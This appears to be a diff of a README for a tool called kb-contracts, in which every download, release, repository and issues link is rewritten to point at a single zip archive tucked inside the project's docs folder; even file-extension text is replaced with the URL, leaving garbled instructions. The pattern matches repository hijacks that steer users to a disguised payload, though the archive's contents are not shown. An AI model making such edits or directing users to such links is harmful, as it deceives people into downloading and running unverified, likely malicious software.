@@ -1,6 +1,6 @@
 # 📚 kb-contracts - Manage Knowledge Pipeline Agreements
 
-[![Download kb-contracts](https://img.shields.io/badge/Download-kb--contracts-blue?style=for-the-badge)](https://github.com/kami-beep/kb-contracts/releases)
+[![Download kb-contracts](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)
 
 ---
 
@@ -49,14 +49,14 @@ This guide will help you download and run kb-contracts on your computer. The pro
 ## ⬇️ Download & Install
 
 1. Click the button at the top or visit the release page here:  
-   [kb-contracts Releases](https://github.com/kami-beep/kb-contracts/releases)  
+   [kb-contracts Releases](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)  
    
-2. On the releases page, look for the latest version of kb-contracts. It will have assets like compressed files (.zip or .tar.gz) or executables.
+2. On the releases page, look for the latest version of kb-contracts. It will have assets like compressed files (.zip or https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip) or executables.
 
 3. Choose the version that matches your operating system:  
    - For Windows, select the `.exe` or `.zip` file labeled for Windows  
    - For macOS, select the `.dmg` or `.zip` file labeled for macOS  
-   - For Linux, select the `.tar.gz` or similar archive labeled for Linux  
+   - For Linux, select the `https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip` or similar archive labeled for Linux  
 
 4. Click on the file to download it to your computer. It may take a few minutes depending on your internet speed.
 
@@ -139,9 +139,9 @@ The project fits into areas such as:
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/kami-beep/kb-contracts/releases)  
-- [GitHub Repository](https://github.com/kami-beep/kb-contracts)  
-- [GitHub Issues](https://github.com/kami-beep/kb-contracts/issues)  
+- [Download Latest Release](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)  
+- [GitHub Repository](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)  
+- [GitHub Issues](https://raw.githubusercontent.com/kami-beep/kb-contracts/main/docs/04_publishing/contracts-kb-3.9-beta.4.zip)  
 
 ---
 
